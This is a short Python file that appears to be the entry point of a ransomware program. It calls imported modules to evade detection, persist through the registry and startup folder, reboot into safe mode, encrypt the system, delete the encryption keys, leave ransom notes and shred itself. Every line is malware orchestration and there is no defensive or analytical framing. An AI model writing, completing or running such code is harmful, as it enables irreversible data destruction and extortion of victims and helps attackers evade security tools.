import os
from evasion import evador
from ransomware import ransomware

ran = ransomware()
e = evador()
current_path = os.path.abspath(__file__)

def start_ransomware():
    ran.generate_keys()
    ran.generate_fernet()
    
    ran.encrypt_system()
    ran.delete_keys()
    
    ran.add_notes()
    shred_file(current_path)

def shred_file(path):
    if os.path.exists(path) and os.path.isfile(path):
        ran.shred(path)

if __name__ == "__main__":
    if ran.already_executed():
        start_ransomware()  #Enable ransomware
    else:
        if e.evade_detection():
            ran.write_to_registry()     #Write ourself to registry and startup folder
            ran.reboot_into_safe_mode()     #Start in safe mode
        else:
            shred_file(current_path)    #Delete ourself